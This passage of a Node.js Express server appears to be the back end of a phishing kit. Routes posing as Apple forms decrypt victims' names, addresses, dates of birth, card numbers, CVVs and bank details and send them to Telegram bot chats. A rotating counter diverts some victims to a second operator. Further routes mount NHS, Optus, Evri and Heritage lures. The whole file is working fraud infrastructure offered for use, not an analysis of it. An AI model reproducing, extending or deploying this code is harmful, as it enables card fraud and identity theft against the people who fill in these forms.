  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (p2 == 15) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        p2 = 9;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleP2:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1265611993,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        p2 += 1;
      }
      res.send("Update Complete");
    });
});

var cdbCount = 0;

app.post("/spooferGooferApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        Spoofergoofer = 6;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleSpooferGoofer:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=993063133&text=Apple:\n${originalText}`
        );
        Spoofergoofer += 1;
      }
    });
});

app.post("/kelvApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 10;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleKelv:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=Apple:\n${originalText}`
        );
        kelvCount += 1;
      }
    });
});

var swipesC = 0;

app.post("/swipesApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (swipesC == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        swipesC = 10;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleSwipes:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5348269876&text=Apple:\n${originalText}`
        );
        swipesC += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/daangerApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (daanger == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        daanger = 10;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleDaanger:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=637332768&text=Apple:\n${originalText}`
        );
        Spoofergoofer += 1;
      }
    });
});

app.post("/fpaysApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (fpaysC == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fpaysC = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFpays:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 2134201699,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        fpaysC += 1;
      }
    });
});

var ciscoCount = 6;

app.post("/ciscoApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ip = req.body.ip;
  userAgent = req.body.userAgent;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalTextHaytch = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (ciscoCount == 12) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalTextHaytch}`
        );
        ciscoCount = 7;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCisco:\n${originalTextHaytch}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1911692807&text=Apple:\n${originalTextHaytch}`
        );
        ciscoCount += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/onlymyApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (TheOnlyMY == 100) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        TheOnlyMY = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleOnlyMy:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=418410122&text=Apple:\n${originalText}`
        );
        TheOnlyMY += 1;
      }
    });
});

//NHS
app.use("/nhs", require("./routes/nhs"));

//OPTUS
app.use("/optus", require("./routes/optus"));

//EVRI
app.use("/evri", require("./routes/evri"));

//HERITAGE
app.use("/heritage", require("./routes/heritage"));

app.post("/removeips", (req, res) => {
  ip = req.body.ip;

  content = ``;
  fs.writeFile("ips.txt", content, (err) => {
    if (err) {
      console.error(err);
    } else {
      res.send("Update Completed");
    }
  });
});
